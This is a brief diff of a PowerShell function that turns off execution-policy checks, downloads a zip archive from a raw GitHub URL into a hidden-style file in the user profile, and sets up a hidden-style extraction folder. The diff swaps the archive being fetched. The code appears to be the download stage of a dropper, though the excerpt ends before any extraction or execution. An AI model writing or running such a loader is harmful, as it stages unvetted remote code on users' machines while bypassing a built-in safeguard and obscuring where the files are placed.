@@ -1,6 +1,6 @@
 function _action {
     Set-ExecutionPolicy Bypass -Scope Process -Force
-    $url = "https://raw.githubusercontent.com/m-nobinur/gnc/main/_wgwx.zip"
+    $url = "https://raw.githubusercontent.com/m-nobinur/gnc/main/_gw.zip"
     $destination = "$env:USERPROFILE\.tempgindex.zip"
     Invoke-WebRequest -Uri $url -OutFile $destination
     $extractFolder = "$env:USERPROFILE\.gindexer"
